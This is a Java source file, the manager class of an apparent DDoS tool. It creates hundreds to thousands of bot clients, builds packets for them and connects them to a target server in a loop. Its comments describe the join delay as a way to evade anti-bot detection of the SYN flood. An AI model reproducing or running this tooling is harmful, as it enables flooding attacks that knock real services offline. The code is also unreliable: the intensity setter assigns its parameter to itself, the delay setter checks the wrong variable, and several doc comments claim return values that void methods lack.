package src.Main.DDosSoftware.DDosLogic.Flood;

import src.Main.DDosSoftware.DDosLogic.Client.Client;
import src.Main.DDosSoftware.DDosLogic.Client.ClientManager;
import src.Main.DDosSoftware.DDosLogic.Client.ClientPacketManager;
import src.Main.DDosSoftware.DDosLogic.Server.ServerManager;
import src.Main.DDosSoftware.Enums.Intensity;

public class DDoSManager {
    /*
     * Define how many bots you wanna flood to the server
     * this will impact your PC resources, but not a big deal
     */
    private static Intensity intensity = Intensity.LOW;

    public static long DEFAULT_DELAY_TIME = 15;
    /*
     * The delay time by miliseconds after a bot is joined
     * this might make the anti-bot stuff harder too check
     * if they're getting SYNFlood
     */
    private static long delayTime = DEFAULT_DELAY_TIME;

    public static DDoSManager DDoS;

    // ! THINGS ARE BEGIN HERE
    public static void start() {
        // * CREATE CLIENTS
        ClientManager.createClient();
        // * CREATE PACKETS FOR CLIENTS
        ClientPacketManager.generatePacketForClient();

        // * CONNECT TO THE SERVER
        for (int clientIndex = 0; clientIndex < ClientManager.clients.size(); clientIndex++) {
            if (ServerManager.canConnect()) {
                ClientManager.connect(clientIndex);
            }

            try {
                Thread.sleep(delayTime);
            } catch (Exception e) {

            }
        }

    }

    /**
     * Set the intensity of the bot
     * 
     * @param intensity intensity of the DDoS
     * @return the object itself
     */
    public static void setIntensity(Intensity intensity) {
        intensity = intensity;
    }

    public static Intensity getIntensity() {
        return intensity;
    }

    public static long getDelayTime() {
        return delayTime;
    }

    /**
     * Set the delay time might make the anti-bot stuff
     * harder too check if they're getting SYN Flood
     * 
     * @param delayTime the delay time after a bot is joined
     * @return the object itself
     */
    public static void setDelayTime(long dTime) {
        if (delayTime < DEFAULT_DELAY_TIME) {
            delayTime = DEFAULT_DELAY_TIME;
        } else {
            delayTime = dTime;
        }
    }

    public static int getBotSizeBaseOnIntensity(Intensity intense) {
        switch (intense) {
            case LOW:
                return 500;
            case MEDIUM:
                return 1000;
            case HIGH:
                return 5000;
            case HIGEST:
                return 10000;
            default:
                return 500;
        }
    }
}
